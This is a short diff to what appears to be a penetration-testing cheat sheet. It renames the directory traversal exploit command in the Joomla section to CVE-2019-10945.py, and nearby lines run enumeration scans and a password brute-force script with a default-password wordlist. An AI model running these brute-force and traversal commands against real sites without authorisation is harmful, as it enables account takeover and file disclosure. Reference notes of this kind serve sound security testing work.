@@ -1051,7 +1051,7 @@ $ curl -s http://<IP address>/administrator/manifests/files/joomla.xml | xmllint
 $ droopescan scan joomla --url <URL>
 $ sudo python3 joomla-brute.py -u <URL> -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr users.txt
 $ python2 joomlascan.py -u <URL>
-$ python3 joomla_dir_trav.py --url "http://<domain name>/administrator/" --username admin --password admin --dir /
+$ python3 CVE-2019-10945.py --url "http://<domain name>/administrator/" --username admin --password admin --dir /
 ```
 
 - Jenkins
